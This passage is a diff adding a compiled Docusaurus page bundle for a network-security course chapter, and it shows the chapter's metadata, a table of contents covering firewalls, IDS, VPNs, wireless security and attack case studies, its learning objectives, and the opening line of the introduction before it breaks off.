@@ -1,0 +1,6124 @@
+"use strict";
+(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[53106],{
+
+/***/ 11049
+(__unused_webpack_module, __webpack_exports__, __webpack_require__) {
+
+// ESM COMPAT FLAG
+__webpack_require__.r(__webpack_exports__);
+
+// EXPORTS
+__webpack_require__.d(__webpack_exports__, {
+  assets: () => (/* binding */ assets),
+  contentTitle: () => (/* binding */ contentTitle),
+  "default": () => (/* binding */ MDXContent),
+  frontMatter: () => (/* binding */ frontMatter),
+  metadata: () => (/* reexport */ site_docs_courses_cyber_security_03_network_security_md_64b_namespaceObject),
+  toc: () => (/* binding */ toc)
+});
+
+;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-03-network-security-md-64b.json
+const site_docs_courses_cyber_security_03_network_security_md_64b_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/03-network-security","title":"Chapter 3: Network Security","description":"Prereq: Chapter 2 (Cryptography) → TLS, IPsec, and WPA2 rely on cryptographic algorithms.","source":"@site/docs/courses/cyber-security/03-network-security.md","sourceDirName":"courses/cyber-security","slug":"/cyber-security/03-network-security","permalink":"/ai-engineering-journey/cyber-security/03-network-security","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"id":"03-network-security","slug":"/cyber-security/03-network-security","title":"Chapter 3: Network Security","sidebar_label":"Chapter 3: Network Security","sidebar_position":3},"sidebar":"course-cyber-security","previous":{"title":"Chapter 2: Cryptography","permalink":"/ai-engineering-journey/cyber-security/02-cryptography"},"next":{"title":"Chapter 4: System & Software Security","permalink":"/ai-engineering-journey/cyber-security/04-system-software"}}');
+// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
+var jsx_runtime = __webpack_require__(74848);
+// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
+var lib = __webpack_require__(28453);
+;// ./docs/courses/cyber-security/03-network-security.md
+
+
+const frontMatter = {
+	id: '03-network-security',
+	slug: '/cyber-security/03-network-security',
+	title: 'Chapter 3: Network Security',
+	sidebar_label: 'Chapter 3: Network Security',
+	sidebar_position: 3
+};
+const contentTitle = 'Chapter 3: Network Security';
+
+const assets = {
+
+};
+
+/*End Image Gallery*/
+
+
+const toc = [{
+  "value": "Learning Objectives",
+  "id": "learning-objectives",
+  "level": 2
+}, {
+  "value": "Table of Contents",
+  "id": "table-of-contents",
+  "level": 2
+}, {
+  "value": "Section 1: Introduction",
+  "id": "section-1-introduction",
+  "level": 2
+}, {
+  "value": "1.1 The OSI Model Security Map",
+  "id": "11-the-osi-model-security-map",
+  "level": 3
+}, {
+  "value": "1.2 CIA Triad in Network Context",
+  "id": "12-cia-triad-in-network-context",
+  "level": 3
+}, {
+  "value": "1.3 Defense-in-Depth (Layered Security)",
+  "id": "13-defense-in-depth-layered-security",
+  "level": 3
+}, {
+  "value": "Section 2: Firewalls",
+  "id": "section-2-firewalls",
+  "level": 2
+}, {
+  "value": "2.1 What Is a Firewall?",
+  "id": "21-what-is-a-firewall",
+  "level": 3
+}, {
+  "value": "2.2 Packet Filter Firewall (Stateless)",
+  "id": "22-packet-filter-firewall-stateless",
+  "level": 3
+}, {
+  "value": "2.3 Stateful Firewall",
+  "id": "23-stateful-firewall",
+  "level": 3
+}, {
+  "value": "2.4 Proxy Firewall (Application Gateway)",
+  "id": "24-proxy-firewall-application-gateway",
+  "level": 3
+}, {
+  "value": "2.5 Next-Generation Firewall (NGFW)",
+  "id": "25-next-generation-firewall-ngfw",
+  "level": 3
+}, {
+  "value": "2.6 Web Application Firewall (WAF)",
+  "id": "26-web-application-firewall-waf",
+  "level": 3
+}, {
+  "value": "2.7 Firewall Types Comparison Table",
+  "id": "27-firewall-types-comparison-table",
+  "level": 3
+}, {
+  "value": "Section 3: IDS and IPS",
+  "id": "section-3-ids-and-ips",
+  "level": 2
+}, {
+  "value": "3.1 Overview",
+  "id": "31-overview",
+  "level": 3
+}, {
+  "value": "3.2 Detection Methods",
+  "id": "32-detection-methods",
+  "level": 3
+}, {
+  "value": "3.3 Snort Rule Writing",
+  "id": "33-snort-rule-writing",
+  "level": 3
+}, {
+  "value": "3.4 Suricata Rule Writing",
+  "id": "34-suricata-rule-writing",
+  "level": 3
+}, {
+  "value": "3.5 IDS vs IPS Comparison",
+  "id": "35-ids-vs-ips-comparison",
+  "level": 3
+}, {
+  "value": "3.6 HIDS vs NIDS",
+  "id": "36-hids-vs-nids",
+  "level": 3
+}, {
+  "value": "3.7 Snort/Suricata → Live Detection Dry Run",
+  "id": "37-snortsuricata--live-detection-dry-run",
+  "level": 3
+}, {
+  "value": "Section 4: Virtual Private Networks (VPNs)",
+  "id": "section-4-virtual-private-networks-vpns",
+  "level": 2
+}, {
+  "value": "4.1 Overview",
+  "id": "41-overview",
+  "level": 3
+}, {
+  "value": "4.2 VPN Types",
+  "id": "42-vpn-types",
+  "level": 3
+}, {
+  "value": "4.3 IPsec VPN",
+  "id": "43-ipsec-vpn",
+  "level": 3
+}, {
+  "value": "4.4 WireGuard VPN",
+  "id": "44-wireguard-vpn",
+  "level": 3
+}, {
+  "value": "4.5 OpenVPN Setup",
+  "id": "45-openvpn-setup",
+  "level": 3
+}, {
+  "value": "4.6 IPsec vs WireGuard vs OpenVPN Comparison",
+  "id": "46-ipsec-vs-wireguard-vs-openvpn-comparison",
+  "level": 3
+}, {
+  "value": "Section 5: Network Segmentation",
+  "id": "section-5-network-segmentation",
+  "level": 2
+}, {
+  "value": "5.1 Overview",
+  "id": "51-overview",
+  "level": 3
+}, {
+  "value": "5.2 VLANs (Virtual LANs)",
+  "id": "52-vlans-virtual-lans",
+  "level": 3
+}, {
+  "value": "5.3 DMZ (Demilitarized Zone)",
+  "id": "53-dmz-demilitarized-zone",
+  "level": 3
+}, {
+  "value": "5.4 Micro-Segmentation",
+  "id": "54-micro-segmentation",
+  "level": 3
+}, {
+  "value": "Section 6: Protocol Security",
+  "id": "section-6-protocol-security",
+  "level": 2
+}, {
+  "value": "6.1 DNS Security",
+  "id": "61-dns-security",
+  "level": 3
+}, {
+  "value": "6.2 DHCP Security",
+  "id": "62-dhcp-security",
+  "level": 3
+}, {
+  "value": "6.3 BGP Security",
+  "id": "63-bgp-security",
+  "level": 3
+}, {
+  "value": "6.4 SNMP Security",
+  "id": "64-snmp-security",
+  "level": 3
+}, {
+  "value": "Section 7: Wireless Security",
+  "id": "section-7-wireless-security",
+  "level": 2
+}, {
+  "value": "7.1 Overview",
+  "id": "71-overview",
+  "level": 3
+}, {
+  "value": "7.2 WPA2 vs WPA3",
+  "id": "72-wpa2-vs-wpa3",
+  "level": 3
+}, {
+  "value": "7.3 802.1X / EAP",
+  "id": "73-8021x--eap",
+  "level": 3
+}, {
+  "value": "7.4 Rogue AP Detection",
+  "id": "74-rogue-ap-detection",
+  "level": 3
+}, {
+  "value": "7.5 Wireless Attacks",
+  "id": "75-wireless-attacks",
+  "level": 3
+}, {
+  "value": "7.6 WPA3 Security",
+  "id": "76-wpa3-security",
+  "level": 3
+}, {
+  "value": "Section 8: Network Access Control (NAC)",
+  "id": "section-8-network-access-control-nac",
+  "level": 2
+}, {
+  "value": "8.1 Overview",
+  "id": "81-overview",
+  "level": 3
+}, {
+  "value": "8.2 NAC Edge Cases",
+  "id": "82-nac-edge-cases",
+  "level": 3
+}, {
+  "value": "Section 9: DDoS Mitigation",
+  "id": "section-9-ddos-mitigation",
+  "level": 2
+}, {
+  "value": "9.1 Overview",
+  "id": "91-overview",
+  "level": 3
+}, {
+  "value": "9.2 DDoS Attack Types",
+  "id": "92-ddos-attack-types",
+  "level": 3
+}, {
+  "value": "9.3 Mitigation Strategies",
+  "id": "93-mitigation-strategies",
+  "level": 3
+}, {
+  "value": "9.4 DDoS Mitigation Comparison Table",
+  "id": "94-ddos-mitigation-comparison-table",
+  "level": 3
+}, {
+  "value": "Section 10: Zero Trust Networking (ZTN)",
+  "id": "section-10-zero-trust-networking-ztn",
+  "level": 2
+}, {
+  "value": "10.1 Overview",
+  "id": "101-overview",
+  "level": 3
+}, {
+  "value": "10.2 Zero Trust Architecture Components",
+  "id": "102-zero-trust-architecture-components",
+  "level": 3
+}, {
+  "value": "10.3 Zero Trust Implementation: BeyondCorp (Google)",
+  "id": "103-zero-trust-implementation-beyondcorp-google",
+  "level": 3
+}, {
+  "value": "10.4 Zero Trust Edge Cases",
+  "id": "104-zero-trust-edge-cases",
+  "level": 3
+}, {
+  "value": "Section 11: Case Studies",
+  "id": "section-11-case-studies",
+  "level": 2
+}, {
+  "value": "11.1 WannaCry Ransomware (May 2017)",
+  "id": "111-wannacry-ransomware-may-2017",
+  "level": 3
+}, {
+  "value": "11.2 Mirai Botnet (October 2016)",
+  "id": "112-mirai-botnet-october-2016",
+  "level": 3
+}, {
+  "value": "11.3 Stuxnet (2010)",
+  "id": "113-stuxnet-2010",
+  "level": 3
+}, {
+  "value": "Section 12: Practical Hands-On Lab",
+  "id": "section-12-practical-hands-on-lab",
+  "level": 2
+}, {
+  "value": "12.1 Lab Setup",
+  "id": "121-lab-setup",
+  "level": 3
+}, {
+  "value": "12.2 iptables/nftables → Basic Firewall Implementation",
+  "id": "122-iptablesnftables--basic-firewall-implementation",
+  "level": 3
+}, {
+  "value": "12.3 Nmap → Service Detection, OS Fingerprinting, NSE Scripts",
+  "id": "123-nmap--service-detection-os-fingerprinting-nse-scripts",
+  "level": 3
+}, {
+  "value": "12.4 Wireshark/tshark → Deep Packet Inspection",
+  "id": "124-wiresharktshark--deep-packet-inspection",
+  "level": 3
+}, {
+  "value": "12.5 tcpdump → Packet Capture and Analysis",
+  "id": "125-tcpdump--packet-capture-and-analysis",
+  "level": 3
+}, {
+  "value": "12.6 OpenVPN Setup",
+  "id": "126-openvpn-setup",
+  "level": 3
+}, {
+  "value": "12.7 WireGuard Quick Setup",
+  "id": "127-wireguard-quick-setup",
+  "level": 3
+}, {
+  "value": "12.8 ZAP Proxy → Web Traffic Inspection",
+  "id": "128-zap-proxy--web-traffic-inspection",
+  "level": 3
+}, {
+  "value": "12.9 BetterCAP → ARP Spoofing Detection",
+  "id": "129-bettercap--arp-spoofing-detection",
+  "level": 3
+}, {
+  "value": "12.10 Airodump/aireplay → Wireless Testing",
+  "id": "1210-airodumpaireplay--wireless-testing",
+  "level": 3
+}, {
+  "value": "Section 13: Comparison Tables",
+  "id": "section-13-comparison-tables",
+  "level": 2
+}, {
+  "value": "13.1 Firewall Type Comparison",
+  "id": "131-firewall-type-comparison",
+  "level": 3
+}, {
+  "value": "13.2 IDS vs IPS vs WAF",
+  "id": "132-ids-vs-ips-vs-waf",
+  "level": 3
+}, {
+  "value": "13.3 IPsec vs WireGuard vs OpenVPN",
+  "id": "133-ipsec-vs-wireguard-vs-openvpn",
+  "level": 3
+}, {
+  "value": "13.4 WPA2 vs WPA3",
+  "id": "134-wpa2-vs-wpa3",
+  "level": 3
+}, {
+  "value": "Section 14: Applications in Real Systems",
+  "id": "section-14-applications-in-real-systems",
+  "level": 2
+}, {
+  "value": "14.1 AWS Security Groups (Cloud Firewall)",
+  "id": "141-aws-security-groups-cloud-firewall",
+  "level": 3
+}, {
+  "value": "14.2 Cisco Firepower (NGFW)",
+  "id": "142-cisco-firepower-ngfw",
+  "level": 3
+}, {
+  "value": "14.3 Cloudflare DDoS Protection",
+  "id": "143-cloudflare-ddos-protection",
+  "level": 3
+}, {
+  "value": "14.4 Enterprise Zero Trust (BeyondCorp / Zscaler)",
+  "id": "144-enterprise-zero-trust-beyondcorp--zscaler",
+  "level": 3
+}, {
+  "value": "14.5 Open Source Security Onion",
+  "id": "145-open-source-security-onion",
+  "level": 3
+}, {
+  "value": "Section 15: Interview Corner → 15 Q&amp;As",
+  "id": "section-15-interview-corner--15-qas",
+  "level": 2
+}, {
+  "value": "Q1: What is the difference between a stateful and stateless firewall?",
+  "id": "q1-what-is-the-difference-between-a-stateful-and-stateless-firewall",
+  "level": 3
+}, {
+  "value": "Q2: How does a stateful firewall handle FTP traffic?",
+  "id": "q2-how-does-a-stateful-firewall-handle-ftp-traffic",
+  "level": 3
+}, {
+  "value": "Q3: Explain the difference between IDS and IPS.",
+  "id": "q3-explain-the-difference-between-ids-and-ips",
+  "level": 3
+}, {
+  "value": "Q4: What are the advantages of anomaly-based detection over signature-based detection?",
+  "id": "q4-what-are-the-advantages-of-anomaly-based-detection-over-signature-based-detection",
+  "level": 3
+}, {
+  "value": "Q5: What is the WPA3-Personal improvement over WPA2-Personal?",
+  "id": "q5-what-is-the-wpa3-personal-improvement-over-wpa2-personal",
+  "level": 3
+}, {
+  "value": "Q6: What is the KRACK attack?",
+  "id": "q6-what-is-the-krack-attack",
+  "level": 3
+}, {
+  "value": "Q7: How does DNSSEC prevent cache poisoning?",
+  "id": "q7-how-does-dnssec-prevent-cache-poisoning",
+  "level": 3
+}, {
+  "value": "Q8: What is BGP hijacking and how can it be mitigated?",
+  "id": "q8-what-is-bgp-hijacking-and-how-can-it-be-mitigated",
+  "level": 3
+}, {
+  "value": "Q9: How does a SYN flood work and what are mitigation techniques?",
+  "id": "q9-how-does-a-syn-flood-work-and-what-are-mitigation-techniques",
+  "level": 3
+}, {
+  "value": "Q10: What is the difference between VLAN and VXLAN?",
+  "id": "q10-what-is-the-difference-between-vlan-and-vxlan",
+  "level": 3
+}, {
+  "value": "Q11: Describe the WannaCry infection chain.",
+  "id": "q11-describe-the-wannacry-infection-chain",
+  "level": 3
+}, {
+  "value": "Q12: How does Mirai infect IoT devices?",
+  "id": "q12-how-does-mirai-infect-iot-devices",
+  "level": 3
+}, {
+  "value": "Q13: How is micro-segmentation different from traditional VLAN segmentation?",
+  "id": "q13-how-is-micro-segmentation-different-from-traditional-vlan-segmentation",
+  "level": 3
+}, {
+  "value": "Q14: What is the best practice for deploying wireless in an enterprise?",
+  "id": "q14-what-is-the-best-practice-for-deploying-wireless-in-an-enterprise",
+  "level": 3
+}, {
+  "value": "Q15: How does zero trust differ from traditional perimeter security?",
+  "id": "q15-how-does-zero-trust-differ-from-traditional-perimeter-security",
+  "level": 3
+}, {
+  "value": "Section 16: Summary",
+  "id": "section-16-summary",
+  "level": 2
+}, {
+  "value": "Exercises",
+  "id": "exercises",
+  "level": 2
+}, {
+  "value": "Review Questions",
+  "id": "review-questions",
+  "level": 3
+}, {
+  "value": "Application Problems",
+  "id": "application-problems",
+  "level": 3
+}, {
+  "value": "Case Study Analysis",
+  "id": "case-study-analysis",
+  "level": 3
+}, {
+  "value": "Challenge Problems",
+  "id": "challenge-problems",
+  "level": 3
+}, {
+  "value": "References",
+  "id": "references",
+  "level": 2
+}, {
+  "value": "Section 17: Advanced Firewall Internals",
+  "id": "section-17-advanced-firewall-internals",
+  "level": 2
+}, {
+  "value": "17.1 Netfilter Hooks (Linux Kernel)",
+  "id": "171-netfilter-hooks-linux-kernel",
+  "level": 3
+}, {
+  "value": "17.2 Connection Tracking Internals",
+  "id": "172-connection-tracking-internals",
+  "level": 3
+}, {
+  "value": "17.3 BPF-based Firewalls (eBPF/XDP)",
+  "id": "173-bpf-based-firewalls-ebpfxdp",
+  "level": 3
+}, {
+  "value": "Section 18: Advanced IDS/IPS → Deep Dive",
+  "id": "section-18-advanced-idsips--deep-dive",
+  "level": 2
+}, {
+  "value": "18.1 Suricata Multi-Threading Architecture",
+  "id": "181-suricata-multi-threading-architecture",
+  "level": 3
+}, {
+  "value": "18.2 PCRE Rules → Advanced Pattern Matching",
+  "id": "182-pcre-rules--advanced-pattern-matching",
+  "level": 3
+}, {
+  "value": "18.3 Zeek (formerly Bro) Scripting",
+  "id": "183-zeek-formerly-bro-scripting",
+  "level": 3
+}, {
+  "value": "Section 19: Advanced VPN → DPI and VPN Detection",
+  "id": "section-19-advanced-vpn--dpi-and-vpn-detection",
+  "level": 2
+}, {
+  "value": "19.1 How DPI Identifies VPN Traffic",
+  "id": "191-how-dpi-identifies-vpn-traffic",
+  "level": 3
+}, {
+  "value": "19.2 VPN Detection Evasion",
+  "id": "192-vpn-detection-evasion",
+  "level": 3
+}, {
+  "value": "Section 20: Advanced DDoS → Amplification Attacks",
+  "id": "section-20-advanced-ddos--amplification-attacks",
+  "level": 2
+}, {
+  "value": "20.1 DNS Amplification Attack",
+  "id": "201-dns-amplification-attack",
+  "level": 3
+}, {
+  "value": "Section 21: Advanced Wireless → Enterprise Deployment",
+  "id": "section-21-advanced-wireless--enterprise-deployment",
+  "level": 2
+}, {
+  "value": "21.1 802.1X Full Deployment Topology",
+  "id": "211-8021x-full-deployment-topology",
+  "level": 3
+}, {
+  "value": "21.2 RADIUS Server Logs",
+  "id": "212-radius-server-logs",
+  "level": 3
+}, {
+  "value": "Section 22: Advanced Zero Trust → Google&#39;s BeyondCorp Model",
+  "id": "section-22-advanced-zero-trust--googles-beyondcorp-model",
+  "level": 2
+}, {
+  "value": "22.1 BeyondCorp Principles",
+  "id": "221-beyondcorp-principles",
+  "level": 3
+}, {
+  "value": "22.2 BeyondCorp Implementation (Step CA + Pomerium)",
+  "id": "222-beyondcorp-implementation-step-ca--pomerium",
+  "level": 3
+}, {
+  "value": "Section 23: Advanced Protocol Attacks",
+  "id": "section-23-advanced-protocol-attacks",
+  "level": 2
+}, {
+  "value": "23.1 DHCP Starvation Attack → Full Walkthrough",
+  "id": "231-dhcp-starvation-attack--full-walkthrough",
+  "level": 3
+}, {
+  "value": "23.2 ARP Spoofing Detection → Detailed",
+  "id": "232-arp-spoofing-detection--detailed",
+  "level": 3
+}, {
+  "value": "Section 24: Network Security Monitoring (NSM) Stack",
+  "id": "section-24-network-security-monitoring-nsm-stack",
+  "level": 2
+}, {
+  "value": "24.1 Full NSM Architecture",
+  "id": "241-full-nsm-architecture",
+  "level": 3
+}, {
+  "value": "24.2 Security Onion → All-in-One NSM",
+  "id": "242-security-onion--all-in-one-nsm",
+  "level": 3
+}, {
+  "value": "Section 25: Extended Interview Corner → Advanced Q&amp;As",
+  "id": "section-25-extended-interview-corner--advanced-qas",
+  "level": 2
+}, {
+  "value": "Q16: How does IPsec tunnel mode differ from transport mode? Show packet structure.",
+  "id": "q16-how-does-ipsec-tunnel-mode-differ-from-transport-mode-show-packet-structure",
+  "level": 3
+}, {
+  "value": "Q17: What is the difference between a reverse proxy and a forward proxy in network security?",
+  "id": "q17-what-is-the-difference-between-a-reverse-proxy-and-a-forward-proxy-in-network-security",
+  "level": 3
+}, {
+  "value": "Q18: Explain the TLS 1.3 handshake and its security improvements over TLS 1.2.",
+  "id": "q18-explain-the-tls-13-handshake-and-its-security-improvements-over-tls-12",
+  "level": 3
+}, {
+  "value": "Q19: What is the role of entropy in detecting DNS tunneling?",
+  "id": "q19-what-is-the-role-of-entropy-in-detecting-dns-tunneling",
+  "level": 3
+}, {
+  "value": "Q20: How does SQL injection bypass a packet filter firewall but not a WAF?",
+  "id": "q20-how-does-sql-injection-bypass-a-packet-filter-firewall-but-not-a-waf",
+  "level": 3
+}, {
+  "value": "Q21: Describe the full flow of a DDoS mitigation using Cloudflare.",
+  "id": "q21-describe-the-full-flow-of-a-ddos-mitigation-using-cloudflare",
+  "level": 3
+}, {
+  "value": "Q22: What is the difference between 802.1X and MAC Authentication Bypass (MAB)?",
+  "id": "q22-what-is-the-difference-between-8021x-and-mac-authentication-bypass-mab",
+  "level": 3
+}, {
+  "value": "Q23: Explain the NIST SP 800-207 zero trust architecture core components.",
+  "id": "q23-explain-the-nist-sp-800-207-zero-trust-architecture-core-components",
+  "level": 3
+}, {
+  "value": "Q24: How does the WPA3 SAE handshake prevent offline dictionary attacks?",
+  "id": "q24-how-does-the-wpa3-sae-handshake-prevent-offline-dictionary-attacks",
+  "level": 3
+}, {
+  "value": "Q25: What is the TCP three-way handshake and how does it enable SYN flood attacks?",
+  "id": "q25-what-is-the-tcp-three-way-handshake-and-how-does-it-enable-syn-flood-attacks",
+  "level": 3
+}, {
+  "value": "Q26: Compare Snort and Suricata rule languages. When would you use each?",
+  "id": "q26-compare-snort-and-suricata-rule-languages-when-would-you-use-each",
+  "level": 3
+}, {
+  "value": "Q27: Explain how BGP route leaks happen and the difference from BGP hijacking.",
+  "id": "q27-explain-how-bgp-route-leaks-happen-and-the-difference-from-bgp-hijacking",
+  "level": 3
+}, {
+  "value": "Q28: Describe the contents of the Snort/Suricata rule header and options.",
+  "id": "q28-describe-the-contents-of-the-snortsuricata-rule-header-and-options",
+  "level": 3
+}, {
+  "value": "Q29: What network security controls would you implement at each layer of the OSI model?",
+  "id": "q29-what-network-security-controls-would-you-implement-at-each-layer-of-the-osi-model",
+  "level": 3
+}, {
+  "value": "Q30: Explain the full Stuxnet attack chain and why it was so significant.",
+  "id": "q30-explain-the-full-stuxnet-attack-chain-and-why-it-was-so-significant",
+  "level": 3
+}, {
+  "value": "Section 26: Final Comprehensive Reference → All Tools in One Lab",
+  "id": "section-26-final-comprehensive-reference--all-tools-in-one-lab",
+  "level": 2
+}, {
+  "value": "26.1 Complete Network Security Test Lab",
+  "id": "261-complete-network-security-test-lab",
+  "level": 3
+}, {
+  "value": "TypeScript Implementations",
+  "id": "typescript-implementations",
+  "level": 2
+}, {
+  "value": "1. Firewall Rule Analyzer",
+  "id": "1-firewall-rule-analyzer",
+  "level": 3
+}, {
+  "value": "2. IDS/IPS Rule Engine",
+  "id": "2-idsips-rule-engine",
+  "level": 3
+}, {
+  "value": "Mermaid Diagrams",
+  "id": "mermaid-diagrams",
+  "level": 2
+}, {
+  "value": "1. Firewall Architecture — DMZ with Layered Defense",
+  "id": "1-firewall-architecture--dmz-with-layered-defense",
+  "level": 3
+}, {
+  "value": "2. VPN Tunnel Establishment — IPSec IKEv1 Main Mode",
+  "id": "2-vpn-tunnel-establishment--ipsec-ikev1-main-mode",
+  "level": 3
+}, {
+  "value": "Chapter Quiz",
+  "id": "chapter-quiz",
+  "level": 2
+}, {
+  "value": "Practical Takeaways",
+  "id": "practical-takeaways",
+  "level": 2
+}, {
+  "value": "Summary",
+  "id": "summary",
+  "level": 2
+}];
+function _createMdxContent(props) {
+  const _components = {
+    a: "a",
+    blockquote: "blockquote",
+    code: "code",
+    details: "details",
+    h1: "h1",
+    h2: "h2",
+    h3: "h3",
+    header: "header",
+    hr: "hr",
+    img: "img",
+    li: "li",
+    ol: "ol",
+    p: "p",
+    pre: "pre",
+    section: "section",
+    span: "span",
+    strong: "strong",
+    summary: "summary",
+    table: "table",
+    tbody: "tbody",
+    td: "td",
+    th: "th",
+    thead: "thead",
+    tr: "tr",
+    ul: "ul",
+    ...(0,lib/* useMDXComponents */.R)(),
+    ...props.components
+  };
+  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
+    children: [(0,jsx_runtime.jsx)(_components.header, {
+      children: (0,jsx_runtime.jsx)(_components.h1, {
+        id: "chapter-3-network-security",
+        children: "Chapter 3: Network Security"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Prereq:"
+        }), " Chapter 2 (Cryptography) → TLS, IPsec, and WPA2 rely on cryptographic algorithms.\n", (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Next:"
+        }), " Chapter 4 (System Software Security) → host-based defenses complement network perimeter controls."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "learning-objectives",
+      children: "Learning Objectives"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Identify common security threats at different layers of the OSI model"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Compare firewall architectures: packet filter, stateful, proxy, NGFW, WAF"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Explain IDS/IPS functionality, signature vs anomaly detection, and write Snort/Suricata rules"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Understand VPN mechanisms: IPsec, WireGuard, OpenVPN site-to-site and remote access"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Describe network segmentation: VLANs, DMZ, micro-segmentation"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Analyze protocol security for DNS, DHCP, BGP, SNMP"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Understand wireless security: WPA3, 802.1X, EAP, Rogue AP detection"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Explain DDoS mitigation strategies and zero trust networking principles"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Analyze real-world attacks: WannaCry, Mirai, Stuxnet"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.section, {
+      className: "lesson-visuals",
+      "aria-label": "Visual learning resources",
+      children: ["\n  ", (0,jsx_runtime.jsxs)(_components.header, {
+        children: [(0,jsx_runtime.jsx)(_components.span, {
+          children: "VISUAL LEARNING"
+        }), (0,jsx_runtime.jsx)(_components.h2, {
+          children: "See it. Review it. Remember it."
+        })]
+      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
+        className: "lesson-visual-card",
+        href: "../../assets/images/lessons/cyber-security/03-network-security/handwritten-notes.png",
+        target: "_blank",
+        rel: "noopener",
+        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
+          src: "../../assets/images/lessons/cyber-security/03-network-security/handwritten-notes.png",
+          alt: "Handwritten notes",
+          loading: "lazy"
+        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Handwritten notes"
+          }), "Condensed notes for deliberate review."]
+        }), "\n  "]
+      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
+        className: "lesson-visual-card",
+        href: "../../assets/images/lessons/cyber-security/03-network-security/sticky-notes.png",
+        target: "_blank",
+        rel: "noopener",
+        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
+          src: "../../assets/images/lessons/cyber-security/03-network-security/sticky-notes.png",
+          alt: "Sticky-note revision",
+          loading: "lazy"
+        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Sticky-note revision"
+          }), "Fast recall prompts for revision."]
+        }), "\n  "]
+      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
+        className: "lesson-visual-card",
+        href: "../../assets/images/lessons/cyber-security/03-network-security/visual-explanation.png",
+        target: "_blank",
+        rel: "noopener",
+        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
+          src: "../../assets/images/lessons/cyber-security/03-network-security/visual-explanation.png",
+          alt: "Visual concept guide",
+          loading: "lazy"
+        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Visual concept guide"
+          }), "A connected explanation of the key ideas."]
+        }), "\n  "]
+      }), "\n"]
+    }), "\n", "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "table-of-contents",
+      children: "Table of Contents"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Introduction & OSI Model Security Map"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Firewalls → Packet Filter, Stateful, Proxy, NGFW, WAF"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "IDS/IPS → Signature vs Anomaly, Snort/Suricata Rules"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Virtual Private Networks → IPsec, WireGuard, OpenVPN"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Network Segmentation → VLANs, DMZ, Micro-segmentation"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Protocol Security → DNS, DHCP, BGP, SNMP"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Wireless Security → WPA3, 802.1X, EAP, Rogue AP"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Network Access Control (NAC)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "DDoS Mitigation Strategies"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Zero Trust Networking"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Case Studies → WannaCry, Mirai, Stuxnet"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Practical Hands-On Lab"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Comparison Tables"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Applications in Real Systems"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Interview Corner"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Summary & Exercises"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-1-introduction",
+      children: "Section 1: Introduction"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "11-the-osi-model-security-map",
+      children: "1.1 The OSI Model Security Map"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Network security must be applied at every layer of the OSI model. Each layer has distinct threats and corresponding countermeasures."
